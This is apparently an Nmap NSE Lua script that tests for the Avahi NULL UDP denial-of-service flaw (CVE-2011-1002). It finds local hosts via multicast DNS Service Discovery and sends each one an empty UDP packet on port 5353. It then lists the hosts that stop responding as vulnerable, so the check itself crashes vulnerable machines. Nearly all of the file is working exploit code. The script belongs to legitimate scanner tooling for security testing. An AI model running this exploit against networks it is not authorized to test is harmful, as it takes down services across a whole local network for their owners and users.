local dnssd = require "dnssd"
local nmap = require "nmap"
local stdnse = require "stdnse"
local table = require "table"

description=[[
Attempts to discover hosts in the local network using the DNS Service
Discovery protocol and sends a NULL UDP packet to each host to test
if it is vulnerable to the Avahi NULL UDP packet denial of service
(CVE-2011-1002).

The <code>broadcast-avahi-dos.wait</code> script argument specifies how
many number of seconds to wait before a new attempt of host discovery.
Each host who does not respond to this second attempt will be considered
vulnerable.

Reference:
* http://avahi.org/ticket/325
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002
]]


---
-- @usage
-- nmap --script=broadcast-avahi-dos
--
-- @output
-- | broadcast-avahi-dos:
-- |   Discovered hosts:
-- |     10.0.1.150
-- |     10.0.1.151
-- |   After NULL UDP avahi packet DoS (CVE-2011-1002).
-- |   Hosts that seem down (vulnerable):
-- |_    10.0.1.151
--
-- @args broadcast-avahi-dos.wait Wait time in seconds before executing
--       the check, the default value is 20 seconds.


author = "Djalal Harouni"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"broadcast", "dos", "intrusive", "vuln"}


prerule = function() return true end

avahi_send_null_udp = function(ip)
  local socket = nmap.new_socket("udp")
  local status = socket:sendto(ip, 5353, "")
  socket:close()
  return status
end

action = function()
  local wtime = stdnse.get_script_args("broadcast-avahi-dos.wait") or 20
  local helper = dnssd.Helper:new()
  helper:setMulticast(true)

  local status, result = helper:queryServices()
  if (status) then
    local output, hosts, tmp = {}, {}, {}
    for _, hostcfg in pairs(result) do
      for k, ip in pairs(hostcfg) do
        if type(k) == "string" and k == "name" then
          if avahi_send_null_udp(ip) then
            table.insert(hosts, ip)
            tmp[ip] = true
          end
        end
      end
    end

    if next(hosts) then
      hosts.name = "Discovered hosts:"
      table.insert(output, hosts)
      table.insert(output,
      "After NULL UDP avahi packet DoS (CVE-2011-1002).")

      stdnse.debug3("sleeping for %d seconds", wtime)
      stdnse.sleep(wtime)
      -- try to re-discover hosts
      status, result = helper:queryServices()
      if (status) then
        for _, hostcfg in pairs(result) do
          for k, ip in pairs(hostcfg) do
            if type(k) == "string" and k == "name" and tmp[ip] then
              tmp[ip] = nil
            end
          end
        end
      end

      local vulns = {}
      for ip, _ in pairs(tmp) do
        table.insert(vulns, ip)
      end

      if next(vulns) then
        vulns.name = "Hosts that seem down (vulnerable):"
        table.insert(output, vulns)
      else
        table.insert(output, "Hosts are all up (not vulnerable).")
      end

      return stdnse.format_output(true, output)
    end
  end
end
